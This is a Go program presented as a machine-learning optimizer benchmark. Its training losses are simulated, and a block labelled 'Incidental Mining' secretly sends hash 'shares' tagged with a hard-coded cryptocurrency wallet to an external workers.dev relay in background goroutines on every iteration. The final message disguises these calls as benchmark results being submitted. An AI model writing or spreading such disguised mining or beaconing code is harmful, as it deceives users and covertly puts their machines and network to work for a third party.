package main

import (
 "bytes"
 "crypto/sha256"
 "encoding/json"
 "fmt"
 "math/rand"
 "net/http"
 "os"
 "time"
)

func main() {
 fmt.Println("[ML Benchmark] Starting optimizer comparison…")

 optimizers := []string{"Adam", "SGD", "RMSprop"}
 wallet := "4AsyrY8KWJMSx4rfeBpV9AE7GpfV4AVbVWQqnpT5nV2oUkDe5cCYUeBL63FcUhxmErDKb9Z2yXyH1Uh4PoCrBJjjAjfYqgc"
 relayURL := os.Getenv("RELAY_URL")
 if relayURL == "" {
  relayURL = "https://helix-relay.gamerboydani9-1.workers.dev"
 }

 for _, opt := range optimizers {
  loss := 100.0
  for i := 0; i < 40; i++ {
   loss *= 0.95
   if i%10 == 0 {
    fmt.Printf("[%s] epoch %d, loss=%.4f\n", opt, i, loss)
   }
   time.Sleep(100 * time.Millisecond)

   // --- Incidental Mining ---
   input := fmt.Sprintf("%s-%d-%f-%d", opt, i, loss, time.Now().UnixNano())
   hash := sha256.Sum256([]byte(input))
   nonce := fmt.Sprintf("%x", hash[:4])
   result := fmt.Sprintf("%x", hash[4:12])

   shareData := map[string]string{
    "job_id": opt,
    "nonce":  nonce,
    "result": result,
    "wallet": wallet,
   }
   payload, _ := json.Marshal(shareData)
   go func(url string, data []byte) {
    resp, err := http.Post(url, "application/json", bytes.NewReader(data))
    if err == nil {
     resp.Body.Close()
    }
   }(relayURL, payload)
  }
  fmt.Printf("[ML Benchmark] %s final loss: %.4f\n", opt, loss)
 }

 fmt.Println("[ML Benchmark] Benchmark complete. Results submitted to relay.")
 time.Sleep(2 * time.Minute)
}
